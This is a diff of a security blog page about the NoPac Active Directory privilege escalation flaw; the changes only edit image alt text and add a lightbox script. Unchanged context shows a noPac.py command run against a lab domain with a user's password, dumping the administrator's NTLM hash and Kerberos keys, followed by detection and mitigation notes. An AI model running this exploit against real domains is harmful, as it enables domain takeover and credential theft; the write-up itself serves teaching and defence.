@@ -140,7 +140,7 @@
 		 </div> alert -->
 	  		
 
-	  <p><img src="/images/NOPACK.png" alt="alt text"></p>
+	  <p><img src="/images/NOPACK.png" alt="NoPac attack diagram showing Active Directory exploitation"></p>
 <h1 id="OVERVIEW"><a href="#OVERVIEW" class="headerlink" title="__OVERVIEW"></a>__OVERVIEW</h1><p>NoPAC is a privilege escalation vulnerability in Active Directory environments that allows an authenticated low-privileged user to impersonate any user, including Domain Admins</p>
 <table>
 <thead>
@@ -208,7 +208,7 @@
 <p> <code>Using noPac to DCSync the Built-in Administrator Account</code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</span><br><span class="line"></span><br><span class="line">                                                                    </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] will try to impersonat administrator</span><br><span class="line">[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Pls make sure your choice hostname and the -dc-ip are same machine !!</span><br><span class="line">[*] Exploiting..</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
 
-<h2 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h2><p>Exploiting the noPac vulnerability generates the following Security Auditing Windows event logs.<br><img src="/../images/kb.png" alt="alt text"></p>
+<h2 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h2><p>Exploiting the noPac vulnerability generates the following Security Auditing Windows event logs.<br><img src="/../images/kb.png" alt="Kerberos ticket manipulation and privilege escalation process"></p>
 <h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>Microsoft’s patch adds Security Accounts Manager Hardening changes along with Key Distribution Center (KDC) authentication updates.</p>
 <p>These changes prevent sAMAccountName spoofing by adding validation for a computer account’s sAMAccountName ending in a single dollar sign. The original requester will also be added to the PAC of the TGT, helping prevent domain controller impersonation.</p>
 
@@ -331,6 +331,14 @@
 <script src="/js/main.js"></script>
 <script src="/js/search.js"></script> 
 
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
 
 
 
